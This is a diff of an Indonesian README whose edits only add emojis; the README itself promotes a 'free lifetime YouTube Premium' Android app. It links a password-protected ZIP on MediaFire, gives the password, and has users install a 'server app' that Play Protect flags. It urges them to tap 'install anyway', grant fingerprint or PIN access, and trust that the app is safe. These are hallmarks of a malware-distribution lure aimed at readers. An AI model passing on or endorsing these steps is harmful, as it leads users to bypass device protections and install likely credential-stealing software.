@@ -2,14 +2,14 @@
 # 🧾 UTAMA KAN MEMBACA & PAHAMI
 # ✅ APLIKASI YOUTUBE PREMIUM GRATIS SEUMUR HIDUP , KUSUS PENGGUNA ANDROID 👍
 
-# Buka link MediaFire Untuk Download file
+# Buka link MediaFire Untuk Download file 👇
 
 ```
 https://www.mediafire.com/file/vf7di0372lrjh34/YouTube_premium.zip/file
 ```
 
 # Nama format file Zip 
-# Extra file Zip Meminta password 🔑 Salin & Tempel Password di Bawah ini
+# Extra file Zip Meminta password 🔑 Salin & Tempel Password di Bawah ini👇
 
 ```
 SuburDev
@@ -18,18 +18,18 @@ SuburDev
 # CATATAN: ADA DUA APLIKASI, YOUTUBE PREMIUM & APLIKASI SERVER 
 # PERTAMA INSTALL APLIKASI SERVER LALU APLIKASI YOUTUBE PREMIUM 
 
-# TAMPILAN APLIKASI YOUTUBE PREMIUM 
+# TAMPILAN APLIKASI YOUTUBE PREMIUM 👇
 
 ![Image](https://github.com/user-attachments/assets/ca4b5931-7165-4cd9-8a3d-9381757a0f19)
 
 # TAMPILAN APLIKASI SERVER, PASTI KAN ANDA BENAR MENG INSTALL INI:
 # APLIKASI INI AMAN BISA LOGIN / DAFTAR, HANYA SAJA TERDETEKSI OLEH PLAY PROTECT 
 # LANJUTKAN SAJA TEKAN [ TETAP INSTALL ] TAPI BUTUH AKSES SIDIK JARI ATAU PIN PONSEL KALIAN 
-# TENANG SAJA APLIKASI INI AMAN 
+# TENANG SAJA APLIKASI INI AMAN 👇
 
 ![Image](https://github.com/user-attachments/assets/9c174842-7889-4a8c-98a8-c6f3147e2b3f)
 
-# LINK APLIKASI UNTUK EXTRA FILE ZIP - PLAY STORE 
+# LINK APLIKASI UNTUK EXTRA FILE ZIP - PLAY STORE 👇
 ```
 https://play.google.com/store/apps/details?id=ru.zdevs.zarchiver
 ```
